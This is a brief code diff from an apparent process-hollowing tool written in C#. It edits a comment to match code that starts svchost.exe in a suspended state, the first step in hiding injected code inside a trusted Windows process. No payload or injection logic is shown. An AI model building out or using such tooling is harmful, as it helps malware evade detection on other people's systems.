@@ -106,7 +106,7 @@ namespace ProcessHollowingDLL
 
             si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
 
-            // Create process in suspended state (notepad.exe in this case)
+            // Create process in suspended state (svchost.exe in this case)
             bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
 
             if (!res)
